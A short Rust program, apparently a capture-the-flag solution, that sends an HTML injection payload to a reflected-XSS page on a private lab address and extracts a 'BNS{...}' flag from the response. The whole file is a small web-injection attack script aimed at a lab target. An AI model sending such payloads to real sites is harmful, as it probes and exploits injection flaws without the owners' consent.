use std::error::Error;

use reqwest::blocking::*;

const URL: &'static str = "http://10.164.2.70/vulnerabilities/xss_r/";

pub fn run() -> Result<(), Box<dyn Error>> {
    let payload = "<h1>zenneh</h1>".to_string();
    let query = format!("{}?name={}", URL, payload);
    let body = reqwest::blocking::get(query)?.text()?;

    if let Some(index) = body.find("BNS{") {
        let end_index = body[index..].find("}");
        if let Some(end_idx) = end_index {
            let flag = &body[index..index + end_idx + 1];
            println!("Found flag: {}", flag);
        }
    }

    Ok(())
}
